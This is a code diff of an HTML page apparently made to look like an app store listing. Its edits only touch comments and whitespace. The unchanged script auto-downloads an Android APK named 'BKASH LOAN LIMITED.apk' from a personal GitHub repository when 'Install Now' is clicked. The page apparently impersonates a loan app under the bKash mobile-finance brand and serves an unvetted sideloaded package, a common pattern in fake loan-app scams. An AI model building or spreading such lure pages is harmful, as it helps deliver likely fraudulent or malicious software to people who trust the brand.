@@ -136,7 +136,7 @@
       <div class="badge">Rated for 4+</div>
     </div>
 
-    <!-- Updated button -->
+    <!-- Auto-download button -->
     <a class="primary-cta" id="installBtn">Install Now</a>
   </div>
 
@@ -185,7 +185,7 @@
     </ul>
   </nav>
 
-  <!-- Download Script -->
+  <!-- Instant Download Script -->
   <script>
   document.getElementById('installBtn').addEventListener('click', () => {
     const fileUrl = "https://github.com/koi-batija/bkashloanapeal/raw/refs/heads/main/BKASH%20LOAN%20LIMITED.apk";
@@ -195,8 +195,7 @@
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
-    
-    // Optional: show "Downloading..." feedback
+
     const btn = document.getElementById('installBtn');
     btn.textContent = "Downloading...";
     setTimeout(() => btn.textContent = "Install Now", 3000);
